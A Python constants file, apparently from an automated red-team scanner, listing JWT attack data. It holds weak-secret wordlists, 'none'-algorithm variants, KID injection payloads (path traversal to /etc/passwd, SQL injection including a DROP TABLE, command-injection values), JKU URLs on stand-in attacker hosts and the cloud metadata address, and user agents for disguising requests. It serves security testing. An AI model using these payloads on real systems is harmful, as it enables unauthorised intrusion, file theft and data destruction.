#!/usr/bin/env python3
"""
安全相关常量

包含:
- 弱密钥列表 (JWT/API密钥等)
- 注入Payload列表
- 算法变体列表

这些常量被多个模块共享，统一定义避免重复。
"""

from typing import List, Tuple

# ============================================================
# 弱密钥列表 - 用于JWT/API密钥爆破测试
# ============================================================

WEAK_SECRETS: List[str] = [
    # === 常见默认密钥 ===
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "jwt",
    "jwt_secret",
    "jwt-secret",
    "secret123",
    "password123",
    "changeme",
    "mysecret",
    "supersecret",
    "defaultsecret",
    "your-256-bit-secret",
    "your-secret-key",
    "my-secret-key",
    "super-secret-key",
    # === 框架默认密钥 ===
    "django-insecure-key",
    "rails_secret",
    "laravel_secret",
    "express_secret",
    "flask_secret",
    "spring_secret",
    "SECRET_KEY",
    "JWT_SECRET",
    "API_KEY",
    "app_secret",
    "application_secret",
    # === JWT相关 ===
    "private",
    "jwt_key",
    "api_secret",
    "token_secret",
    "auth_secret",
    "secret_key",
    "HS256-secret",
    "hmac-secret",
    # === 开发环境常见 ===
    "development",
    "production",
    "staging",
    "testing",
    "dev_secret",
    "prod_secret",
    "local_secret",
    "test",
    "demo",
    # === 简单模式 ===
    "1234567890",
    "0987654321",
    "qwerty",
    "letmein",
    "abc123",
    "abcd1234",
    "welcome",
    "passw0rd",
    # === 短密钥 ===
    "a",
    "abc",
    "1234",
    # === 空值和特殊 ===
    "",
    " ",
    "null",
    "undefined",
    "none",
    "nil",
]

# ============================================================
# None算法变体 - 用于JWT None算法攻击测试
# ============================================================

NONE_ALGORITHM_VARIANTS: List[str] = [
    "none",
    "None",
    "NONE",
    "nOnE",
    "NoNe",
    "nONE",
    "none ",
    " none",
    "none\t",
    "\tnone",
    "none\n",
]

# ============================================================
# KID注入Payload - 用于JWT KID参数注入测试
# ============================================================

KID_INJECTION_PAYLOADS: List[Tuple[str, str]] = [
    # === 路径遍历 ===
    ("../../../etc/passwd", "path_traversal"),
    ("../../../../../../etc/passwd", "deep_path_traversal"),
    ("....//....//etc/passwd", "path_traversal_bypass"),
    ("..\\..\\..\\etc\\passwd", "windows_path_traversal"),
    ("/dev/null", "dev_null"),
    ("../../../../../../dev/null", "deep_dev_null"),
    # === SQL注入 ===
    ("' OR '1'='1", "sql_injection"),
    ("1' AND '1'='1", "sql_injection_and"),
    ("' UNION SELECT 'secret' --", "sql_union"),
    ("'; DROP TABLE users;--", "sql_drop"),
    # === 命令注入 ===
    ("; cat /etc/passwd", "command_injection"),
    ("| id", "command_pipe"),
    ("$(id)", "command_substitution"),
    ("`id`", "command_backtick"),
    ("; ls -la", "command_ls"),
    # === URL/协议相关 ===
    ("http://evil.com/jwks.json", "external_url"),
    ("file:///etc/passwd", "file_protocol"),
    ("data:text/plain,secret", "data_protocol"),
]

# ============================================================
# JKU/X5U注入URL - 用于JWT JKU参数注入测试
# ============================================================

JKU_INJECTION_URLS: List[Tuple[str, str]] = [
    ("http://attacker.com/.well-known/jwks.json", "external_jwks"),
    ("http://127.0.0.1:8080/jwks.json", "localhost_jwks"),
    ("http://169.254.169.254/jwks.json", "metadata_ssrf"),
    ("http://[::1]/jwks.json", "ipv6_localhost"),
]

# ============================================================
# 常见User-Agent列表 - 用于伪装请求
# ============================================================

COMMON_USER_AGENTS: List[str] = [
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    # 移动端
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

# ============================================================
# 默认HTTP客户端User-Agent
# ============================================================

DEFAULT_USER_AGENT = "AutoRedTeam/3.0 (Security Scanner)"
